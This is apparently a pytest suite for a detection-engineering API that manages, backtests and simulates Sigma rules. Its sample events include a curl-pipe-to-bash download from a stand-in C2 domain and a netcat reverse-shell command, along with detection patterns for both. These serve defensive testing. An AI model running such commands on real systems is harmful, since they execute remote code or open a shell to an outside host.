"""Detection Engineering & Footprint Target Query Tests.

Verifies:
1. Custom Sigma rule management (list, import, patch, delete).
2. Ad-hoc custom Sigma YAML backtesting against historical event store.
3. Target Indicator Footprint query (/footprint/target/query).
"""

from .conftest import make_run

SAMPLE_SIGMA_YAML = """
title: Test Malicious Curl Execution
id: e2b08fa1-test-curl-0001
status: experimental
description: Detects curl downloading bash scripts directly into interpreter
level: high
tags:
  - attack.execution
  - attack.t1059.004
detection:
  selection:
    CommandLine|contains:
      - 'curl http'
      - 'curl https'
  condition: selection
"""


def test_custom_sigma_rules_lifecycle(client):
    # 1. Initially empty or listable
    resp = client.get("/rules/sigma/custom")
    assert resp.status_code == 200
    initial_count = len(resp.json())

    # 2. Import custom rule
    resp = client.post("/rules/sigma/import", json={"sigma_yaml": SAMPLE_SIGMA_YAML, "enabled": True})
    assert resp.status_code == 200
    rule = resp.json()["rule"]
    rule_id = rule["rule_id"]
    assert "test-curl" in rule_id or "curl" in rule["title"].lower()
    assert rule["enabled"] is True

    # 3. Retrieve custom rules
    resp = client.get("/rules/sigma/custom")
    assert resp.status_code == 200
    rules = resp.json()
    assert any(r["rule_id"] == rule_id for r in rules)

    # 4. Patch rule to disabled
    resp = client.patch(f"/rules/sigma/custom/{rule_id}", json={"enabled": False, "level": "medium"})
    assert resp.status_code == 200
    updated = resp.json()["rule"]
    assert updated["enabled"] is False
    assert updated["level"] == "medium"

    # 5. Delete custom rule
    resp = client.delete(f"/rules/sigma/custom/{rule_id}")
    assert resp.status_code == 200
    assert resp.json()["status"] == "deleted"

    # 6. Verify deleted
    resp = client.get("/rules/sigma/custom")
    assert not any(r["rule_id"] == rule_id for r in resp.json())


def test_custom_rule_backtest(client):
    run_id = make_run(client, sample_name="curl_agent.exe")
    # Ingest an event that matches the curl rule
    client.post(
        "/ingest/batch",
        json=[
            {
                "run_id": run_id,
                "platform": "linux",
                "event_type": "process_create",
                "timestamp": "2026-08-01T12:00:00Z",
                "pid": 2048,
                "process_name": "curl",
                "command_line": "curl https://c2-tracker.org/payload.sh | bash",
            }
        ],
    )

    # Backtest with raw YAML
    resp = client.post(
        "/rules/backtest/custom",
        json={"sigma_yaml": SAMPLE_SIGMA_YAML, "max_events": 500},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["events_scanned"] >= 1
    assert data["matches_count"] >= 1
    assert len(data["sample_matches"]) >= 1
    assert data["sample_matches"][0]["process_name"] == "curl"


def test_footprint_target_query(client):
    # Query an IP target with mock=1
    resp = client.get("/footprint/target/query?target=198.51.100.44&mock=1")
    assert resp.status_code == 200
    data = resp.json()
    assert data["sample"]["name"] == "198.51.100.44"
    assert len(data["seed_ips"]) == 1
    assert data["seed_ips"][0]["ip"] == "198.51.100.44"
    assert len(data["passive"]["resolutions"]) > 0
    assert len(data["passive"]["passive_dns"]) > 0

    # Query a domain target with mock=1
    resp = client.get("/footprint/target/query?target=c2-tracker.org&mock=1")
    assert resp.status_code == 200
    domain_data = resp.json()
    assert domain_data["sample"]["name"] == "c2-tracker.org"
    assert len(domain_data["seed_ips"]) >= 1


def test_sigma_bundle_import_and_export(client):
    bundle_yaml = """title: Bundle Rule Alpha
id: aaaaaaaa-1111-2222-3333-444444444444
status: experimental
level: high
tags:
    - attack.execution
    - attack.t1059
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - 'malicious_bundle_probe_a'
    condition: selection
---
title: Bundle Rule Beta
id: bbbbbbbb-1111-2222-3333-444444444444
status: experimental
level: critical
tags:
    - attack.persistence
    - attack.t1053.003
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - 'malicious_bundle_probe_b'
    condition: selection
"""
    # 1. Import multi-document bundle
    resp = client.post("/rules/sigma/import", json={"sigma_yaml": bundle_yaml, "enabled": True})
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "imported"
    assert data["count"] == 2
    assert len(data["rules"]) == 2
    assert "bundle-rule-alpha" in data["rules"][0]["rule_id"]
    assert "bundle-rule-beta" in data["rules"][1]["rule_id"]

    # 2. Check rules in custom rules endpoint
    resp = client.get("/rules/sigma/custom")
    assert resp.status_code == 200
    custom_rules = resp.json()
    rule_ids = [r["rule_id"] for r in custom_rules]
    assert any("bundle-rule-alpha" in r for r in rule_ids)
    assert any("bundle-rule-beta" in r for r in rule_ids)

    # 3. Check Sigma bundle export includes these rules
    resp = client.get("/rules/sigma/export")
    assert resp.status_code == 200
    assert "text/yaml" in resp.headers.get("content-type", "") or "x-yaml" in resp.headers.get("content-type", "")
    exported_text = resp.text
    assert "Bundle Rule Alpha" in exported_text
    assert "Bundle Rule Beta" in exported_text
    assert "---" in exported_text


def test_visual_builder_to_yaml_and_simulation(client):
    # 1. Convert visual form to YAML
    form_data = {
        "title": "Visual Builder Netcat Reverse Shell",
        "level": "critical",
        "platform": "linux",
        "category": "process_creation",
        "mitre_tactics": ["execution"],
        "mitre_techniques": ["T1059"],
        "criteria": [
            {
                "field": "CommandLine",
                "modifier": "contains",
                "values": ["nc -e", "netcat -e"],
            }
        ],
        "exclusions": [
            {
                "field": "CommandLine",
                "modifier": "contains",
                "values": ["benign_test_skip"],
            }
        ]
    }
    resp = client.post("/rules/visual-to-yaml", json=form_data)
    assert resp.status_code == 200
    yaml_str = resp.json()["sigma_yaml"]
    assert "Visual Builder Netcat Reverse Shell" in yaml_str
    assert "nc -e" in yaml_str
    assert "benign_test_skip" in yaml_str
    assert "condition: selection and not filter" in yaml_str

    # 2. Simulate matching event
    matching_event = {
        "event_type": "process_create",
        "process_name": "nc",
        "command_line": "nc -e /bin/sh 10.0.0.1 4444",
        "pid": 5544,
        "platform": "linux"
    }
    sim_resp = client.post("/rules/simulate", json={"sigma_yaml": yaml_str, "event": matching_event})
    assert sim_resp.status_code == 200
    sim_data = sim_resp.json()
    assert sim_data["matched"] is True
    assert sim_data["severity"] == "malicious"
    assert sim_data["simulated_alert"] is not None
    assert sim_data["simulated_alert"]["mitre_technique"] == "T1059"

    # 3. Simulate excluded event (should NOT match)
    excluded_event = {
        "event_type": "process_create",
        "process_name": "nc",
        "command_line": "nc -e /bin/sh 10.0.0.1 4444 benign_test_skip",
        "pid": 5545,
        "platform": "linux"
    }
    sim_resp = client.post("/rules/simulate", json={"sigma_yaml": yaml_str, "event": excluded_event})
    assert sim_resp.status_code == 200
    assert sim_resp.json()["matched"] is False


def test_rule_live_test_trigger(client):
    yaml_rule = """title: Live Trigger Demo Rule
id: e2b08fa1-trigger-demo-0001
status: experimental
level: high
tags:
  - attack.execution
  - attack.t1059
detection:
  selection:
    CommandLine|contains:
      - 'simulated_live_trigger_probe'
  condition: selection
"""
    test_event = {
        "event_type": "process_create",
        "process_name": "bash",
        "command_line": "bash -c simulated_live_trigger_probe",
        "pid": 9911,
        "platform": "linux"
    }
    resp = client.post("/rules/test-trigger", json={"sigma_yaml": yaml_rule, "event": test_event})
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "triggered"
    assert data["alerts_count"] >= 1
    assert data["alert"]["rule_name"] == "Live Trigger Demo Rule"
    assert "findings" in data["findings_url"]

